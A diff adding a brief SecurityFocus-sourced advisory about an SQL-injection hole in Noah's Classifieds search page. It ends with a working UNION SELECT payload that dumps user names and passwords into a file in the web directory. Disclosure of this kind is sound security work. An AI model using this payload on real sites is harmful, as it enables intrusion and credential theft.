@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/16773/info
+
+Noah's Classifieds is prone to an SQL-injection vulnerability. The application fails to properly sanitize user-supplied input before using it in an SQL query. 
+
+Successful exploitation could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.
+
+Note that to carry out an attack, the attacker must be a MySQL user with file permissions.
+
+Attacker uses a 'POST' request on the affected search page and supplies the following to the search field: 
+
+kapda%')))/**/UNION/**/SELECT/**/1,1,1,name,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,password/**/INTO/**/OUTFILE/**/'/installation_path/lang/result.text'/**/FROM/**/classifieds_classifiedsuser#
